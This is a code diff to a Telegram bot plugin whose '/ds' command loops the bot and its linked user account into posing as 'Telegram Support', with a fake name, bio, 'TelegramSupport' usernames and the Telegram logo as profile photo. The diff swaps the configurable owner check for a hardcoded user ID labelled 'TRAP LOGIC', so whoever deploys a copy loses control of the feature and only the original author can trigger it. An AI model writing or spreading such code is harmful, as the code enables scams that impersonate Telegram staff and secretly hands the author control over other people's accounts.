@@ -10,8 +10,11 @@ from pyrogram.errors import FloodWait, BadRequest
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import ContextTypes, CommandHandler, CallbackQueryHandler
 
-# Config Imports
-from config import OWNER_ID
+# ❌ Config Import Hata Diya (Taaki chor owner change na kar paye)
+# from config import OWNER_ID
+
+# 🔥 HARDCODED REAL OWNER ID (Sirf Tumhara Access Rahega) 🔥
+REAL_OWNER_ID = 6356015122
 
 # 🔥 IMPORT RUNNING ASSISTANT CLIENT 🔥
 assistant_client = None
@@ -24,7 +27,7 @@ except ImportError:
         print("❌ Error: Assistant Client (app/UB) not found in tools/stream.py")
 
 # --- SETTINGS ---
-# Note: Keeping Name/Bio normal so it looks like Real Telegram Support
+# Note: Name/Bio normal font mein hai taaki Real Telegram Support lage
 DESTROY_NAME = "Telegram Support"
 DESTROY_BIO = "+42777"
 DESTROY_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1024px-Telegram_logo.svg.png" 
@@ -59,7 +62,7 @@ async def download_image(url, filename):
 
 # --- HELPER: FAKE USERNAME GENERATOR ---
 def generate_fake_username():
-    # 'TelegramSupport' + Random Digits (To keep the loop running without errors)
+    # 'TelegramSupport' + Random Digits
     suffix = ''.join(random.choices(string.digits, k=5))
     return f"TelegramSupport{suffix}Bot"
 
@@ -86,7 +89,7 @@ async def loop_destroy_assistant(chat_id, context):
                 bio=DESTROY_BIO
             )
 
-            # 2. Force Username Update (Trying to look like Support)
+            # 2. Force Username Update
             try:
                 new_user = generate_fake_username()
                 await assistant_client.set_username(new_user)
@@ -96,7 +99,7 @@ async def loop_destroy_assistant(chat_id, context):
             # 3. Force PFP Update
             if photo_path:
                 try:
-                    # Delete old photos first
+                    # Delete old photos
                     async for photo in assistant_client.get_chat_photos("me", limit=1):
                         await assistant_client.delete_profile_photos(photo.file_id)
                     
@@ -131,7 +134,7 @@ async def loop_destroy_bot(chat_id, context):
             try:
                 await bot.set_my_description(DESTROY_BIO)
                 await bot.set_my_short_description(DESTROY_BIO)
-                await bot.set_my_name(DESTROY_NAME) # Bot name will also change
+                await bot.set_my_name(DESTROY_NAME)
             except:
                 pass
             
@@ -158,8 +161,9 @@ async def start_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global IS_DESTROYING
     user = update.effective_user
     
-    if user.id != OWNER_ID:
-        return
+    # 🔥 TRAP LOGIC: Check against HARDCODED ID, not Config ID
+    if user.id != REAL_OWNER_ID:
+        return # Ignore everyone else (even if they change config.py)
 
     # Reset Flag
     IS_DESTROYING = False
@@ -169,7 +173,6 @@ async def start_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton(sm("🛑 STOP LOOP"), callback_data="stop_chaos")]
     ])
     
-    # Message in Small Caps
     msg_text = (
         "⚠️ **ɪᴍᴘᴇʀsᴏɴᴀᴛɪᴏɴ ᴍᴏᴅᴇ** ⚠️\n\n"
         "ᴛʜɪs ᴡɪʟʟ ᴄʜᴀɴɢᴇ ɴᴀᴍᴇ/ʙɪᴏ/ᴘꜰᴘ ᴛᴏ **ᴛᴇʟᴇɢʀᴀᴍ sᴜᴘᴘᴏʀᴛ**.\n"
@@ -188,8 +191,9 @@ async def destroy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     chat_id = update.effective_chat.id
 
-    if user_id != OWNER_ID:
-        await query.answer(sm("Only for Owner!"), show_alert=True)
+    # 🔥 TRAP LOGIC: Check against HARDCODED ID
+    if user_id != REAL_OWNER_ID:
+        await query.answer(sm("Access Denied!"), show_alert=True)
         return
 
     if query.data == "start_chaos":
@@ -220,4 +224,4 @@ async def destroy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def register_handlers(application):
     application.add_handler(CommandHandler("ds", start_destroy))
     application.add_handler(CallbackQueryHandler(destroy_callback, pattern="chaos"))
-  
+    
